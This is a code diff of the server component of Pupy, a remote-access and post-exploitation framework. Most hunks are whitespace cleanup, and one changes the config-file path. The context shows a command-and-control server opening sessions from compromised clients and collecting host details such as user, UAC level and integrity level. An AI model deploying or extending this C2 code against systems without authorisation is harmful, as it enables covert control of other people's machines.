@@ -2,15 +2,15 @@
 # --------------------------------------------------------------
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # All rights reserved.
-# 
+#
 # Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
-# 
+#
 # 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
-# 
+#
 # 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
-# 
+#
 # 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
-# 
+#
 # THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
 # --------------------------------------------------------------
 
@@ -56,7 +56,11 @@ class PupyServer(threading.Thread):
         self.current_id=1
         self.config = configparser.ConfigParser()
         if not path.exists('pupy.conf'):
-            copyfile('pupy.conf.default', 'pupy.conf')
+            copyfile(
+                path.join(
+                    path.dirname(__file__), '..', 'pupy.conf'
+                ),
+            'pupy.conf')
         self.config.read("pupy.conf")
         if port is None:
             self.port=self.config.getint("pupyd", "port")
@@ -92,10 +96,10 @@ class PupyServer(threading.Thread):
         import os
         import locale
         os_encoding = locale.getpreferredencoding() or "utf8"
-        if sys.platform == 'win32': 
+        if sys.platform == 'win32':
             from _winreg import *
             import ctypes
-        
+
         def get_integrity_level_win():
           '''from http://www.programcreek.com/python/example/3211/ctypes.c_long'''
           if sys.platform != 'win32':
@@ -206,7 +210,7 @@ class PupyServer(threading.Thread):
             except:
                     return "?"
             while True:
-                try:  
+                try:
                     name, value, type = EnumValue(RawKey, i)
                     if name == "ConsentPromptBehaviorAdmin": consentPromptBehaviorAdmin = value
                     elif name == "EnableLUA": enableLUA = value
@@ -226,13 +230,13 @@ class PupyServer(threading.Thread):
             nSize = DWORD(0)
             windll.advapi32.GetUserNameA(None, byref(nSize))
             error = GetLastError()
-            
+
             ERROR_INSUFFICIENT_BUFFER = 122
             if error != ERROR_INSUFFICIENT_BUFFER:
                 raise WinError(error)
-            
+
             lpBuffer = create_string_buffer('', nSize.value + 1)
-            
+
             success = windll.advapi32.GetUserNameA(lpBuffer, byref(nSize))
             if not success:
                 raise WinError()
@@ -311,7 +315,7 @@ class PupyServer(threading.Thread):
             return (user, node, plat, release, version, machine, macaddr, pid, proc_arch, proc_path, uacLevel, integrity_level_win)
             """))
         l=conn.namespace["get_uuid"]()
-        
+
         with self.clients_lock:
             pc=PupyClient.PupyClient({
                 "id": self.current_id,
@@ -341,7 +345,7 @@ class PupyServer(threading.Thread):
                     client_ip, client_port = conn._conn._config['connid'].split(':')
                 except:
                     client_ip, client_port = "0.0.0.0", 0 # TODO for bind payloads
-                    
+
                 self.handler.display_srvinfo("Session {} opened ({}:{} <- {}:{})".format(self.current_id, server_ip, server_port, client_ip, client_port))
             self.current_id += 1
         if pc:
@@ -357,7 +361,7 @@ class PupyServer(threading.Thread):
                     break
 
     def get_clients(self, search_criteria):
-        """ return a list of clients corresponding to the search criteria. ex: platform:*win* """ 
+        """ return a list of clients corresponding to the search criteria. ex: platform:*win* """
         #if the criteria is a simple id we return the good client
         try:
             index=int(search_criteria)
@@ -395,7 +399,7 @@ class PupyServer(threading.Thread):
             if take:
                 l.add(c)
         return list(l)
-            
+
     def get_clients_list(self):
         return self.clients
 
@@ -476,7 +480,7 @@ class PupyServer(threading.Thread):
         conn=rpyc.utils.factory.connect_stream(stream, PupyService.PupyBindService, {})
         bgsrv=rpyc.BgServingThread(conn)
         bgsrv.SLEEP_INTERVAL=0.001 # consume ressources but faster response ...
-         
+
 
     def run(self):
         self.handler_registered.wait()
@@ -497,11 +501,9 @@ class PupyServer(threading.Thread):
             t.parse_args(transport_kwargs)
         except Exception as e:
             logging.exception(e)
-        
+
         try:
             self.server = t.server(PupyService.PupyService, port = self.port, hostname=self.address, authenticator=authenticator, stream=t.stream, transport=t.server_transport, transport_kwargs=t.server_transport_kwargs, ipv6=self.ipv6)
             self.server.start()
         except Exception as e:
             logging.exception(e)
-
-
